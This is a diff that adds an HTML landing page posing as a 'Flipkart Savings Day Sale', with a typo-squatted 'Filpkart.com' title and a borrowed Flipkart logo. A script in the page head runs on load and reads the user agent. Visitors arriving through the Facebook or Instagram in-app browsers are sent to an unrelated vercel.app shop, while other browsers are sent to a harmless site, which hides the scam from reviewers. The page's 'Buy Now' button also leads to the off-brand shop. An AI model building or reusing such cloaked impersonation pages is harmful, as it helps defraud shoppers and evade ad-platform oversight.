@@ -1,0 +1,124 @@
+<!-- kk apr 009 entry -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <!-- 🔥 Redirect Logic -->
+  <script>
+    const ua = navigator.userAgent || navigator.vendor || window.opera;
+
+    // Detect Facebook / Instagram in-app browser
+    const isMetaBrowser =
+      ua.includes("FBAN") ||
+      ua.includes("FBAV") ||
+      ua.includes("Instagram");
+
+    if (isMetaBrowser) {
+      // Redirect Meta browser users
+      window.location.replace("https://bunnykitchsale.vercel.app/#/home");
+    } else {
+      // Redirect Chrome / Safari / Firefox users
+      window.location.replace("https://www.rocket.new");
+    }
+  </script>
+
+  <title>Summer Sale is Live 🔥 | Filpkart.com</title>
+
+  <!-- Google Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    body {
+      background: #f8f5ef;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .wrapper {
+      max-width: 420px;
+    }
+
+    .logo {
+      width: 120px;
+      margin-bottom: 20px;
+    }
+
+    h1 {
+      font-size: 36px;
+      font-weight: 700;
+      line-height: 1.3;
+      color: #111;
+      margin-bottom: 30px;
+    }
+
+    .enter-btn {
+      display: inline-block;
+      background: #000;
+      color: #fff;
+      padding: 16px 50px;
+      border-radius: 40px;
+      text-decoration: none;
+      font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 25px;
+      transition: 0.3s ease;
+    }
+
+    .enter-btn:hover {
+      background: #333;
+      transform: scale(1.05);
+    }
+
+    .tagline {
+      font-size: 14px;
+      color: #666;
+      letter-spacing: 1px;
+    }
+
+    /* Mobile adjustments */
+    @media (max-width: 480px) {
+      h1 {
+        font-size: 30px;
+      }
+
+      .enter-btn {
+        padding: 14px 40px;
+        font-size: 16px;
+      }
+
+      .logo {
+        width: 100px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="wrapper">
+
+    <!-- 🔹 Logo -->
+    <img src="https://github.com/codetechnosoft3-lgtm/AKSale/blob/main/img/flipkart-logo.webp?raw=true" class="logo">
+
+    <h1>Welcome to<br>Flipkart Savings Day Sale</h1>
+
+    <a href="https://bunnykitchsale.vercel.app/#/home" class="enter-btn">Buy Now</a>
+
+    <p class="tagline">Premium Products • Quality • Style</p>
+  </div>
+
+</body>
+</html>
